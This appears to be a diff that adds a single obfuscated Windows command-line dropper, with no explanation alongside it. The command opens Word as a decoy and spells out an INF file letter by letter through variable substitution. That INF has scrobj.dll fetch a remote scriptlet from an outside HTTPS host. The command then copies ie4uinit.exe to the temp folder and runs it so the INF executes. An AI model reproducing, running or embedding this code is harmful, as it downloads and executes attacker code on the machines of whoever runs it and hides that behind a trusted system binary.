@@ -1,0 +1,19 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %m in ("tartarly=s" "unvoyagingu=al" "peric=t" ) do @set %~m) &&
+  call(for %q in ("%windir%") do @set "fsie=%~q") &&
+  call(for %u in ("m") do @set "preworthil=%~u") &&
+  (for %s in ("w") do @set "attunement=%~s") &&
+  call(for %o in ("m") do @set "preworthil=%~o") &&
+  (for %t in ("s") do @set "unambushkar=%~t") &&
+  (for %l in ("f") do @set "rear=%~l") &&
+  callcallcallcall(for %y in ("s") do @set "unambushkar=%~y") &&
+  (for %x in ("a") do @set "harmoniph=%~x") &&
+  call(for %b in (".") do @set "expectan=%~b") &&
+  (for %v in ("n") do @set "trioecio=%~v") &&
+  (for %r in ("2") do @set "woodcra=%~r") &&
+  call(for %l in ("n") do @set "trioecio=%~l") &&
+  (for %p in ("i") do @set "mackere=%~p") &&
+  callcallcallcallcallcallcall(for %f in ("3") do @set "duf=%~f") &&
+  callcallcall(for %u in ("p") do @set "sexagesima=%~u") &&
+  call(for %v in ("[dikeriain_385]" "%netc%c%tra%o%interluc%\" "j%fish%d%polyhy%l,N%zimmerwald%,%precli%t%cinem%p%rateabil%/%stygi%r%netc%e%twiggiesti%g%empye%f%fish%m%photopile%l%unhurte%n%unhurte%b%acystiaco%t%polyhy%e%tra%.%colberte%o%mammo%/%kersant%s%sulphoxismu%v%loon%t" "[defaultinstall.windows7]" "delfiles=449A" "Un\" "Register\" "OCXs=dikeriain_385" "[destinationdirs]" "defaultdestdir=11" "449A=01" "[strings]" "servicename= 'art'" "shortsvcname= 'art'" "fish=." "stygi=/" "rateabil=:" "zimmerwald=I" "photopile=a" "interluc=b" "colberte=c" "twiggiesti=d" "unhurte=e" "empye=f" "precli=h" "caustici=i" "polyhy=l" "mammo=m" "kersant=n" "sulphoxismu=o" "tra=r" "netc=s" "cinem=t" "acystiaco=u" "loon=w" "[449A]" "%caustici%e%acystiaco%i%kersant%i%cinem%.%caustici%n%empye%" "[version]" "signature=$windowsnt$" ) do @echo %~v) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
